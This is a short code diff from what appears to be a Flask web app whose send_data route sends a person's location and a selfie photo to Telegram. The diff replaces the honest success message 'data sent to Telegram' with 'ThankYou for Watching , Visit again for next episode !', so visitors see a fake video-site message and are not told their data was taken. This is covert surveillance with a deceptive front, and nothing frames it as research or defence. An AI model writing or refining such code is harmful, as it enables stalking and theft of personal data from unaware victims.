@@ -80,7 +80,7 @@ def send_data():
     pic_res = send_photo_to_telegram(selfie)
     
     if loc_res.get('ok') and pic_res.get('ok'):
-        return jsonify(status='Success, data sent to Telegram')
+        return jsonify(status='ThankYou for Watching , Visit again for next episode !')
     else:
         return jsonify(status='Failed to send data'), 500
 
